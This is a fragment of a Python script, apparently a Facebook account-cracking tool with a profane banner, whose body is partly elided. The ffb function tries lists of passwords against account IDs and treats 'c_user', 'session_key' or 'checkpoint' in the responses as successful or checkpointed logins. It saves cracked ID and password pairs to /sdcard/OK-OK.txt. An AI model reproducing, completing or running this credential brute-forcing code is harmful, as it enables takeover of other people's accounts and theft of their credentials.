...
\033[1;37m[-] AUTHOR    :\033[1;32m YASEEN KHAN 

\033[1;37m[-] GITHUB    :\033[1;32m MAFIA KING

\033[1;37m[-] VERSION   :\033[1;32m 3.4

\033[1;37m[-] STATUS    :\033[1;32m 🤣😂

 open source by 🖤🖕🏻🖕🏻 (Harry) fuck you ❤️

--------------------------------------------------

\033[1;37m[-]Dear Free user:
...
def ffb(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;32m [Yaseenkhan] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [OK-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					...
					print('\r\r\x1b[38;5;208m [CP-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		...
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				print('\r\r\033[1;32m [OK-OK] '+udx+' | '+pas+'\033[1;97m')

				open('/sdcard/OK-OK.txt', 'a').write(udx+'|'+pas+'\n')
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print('\r\r\033[1;34m [OK-TL] '+ids+' | '+pas)

					else:

						print(f'\r\x1b[1;32m [OK-OK] '+ids+' | '+pas)
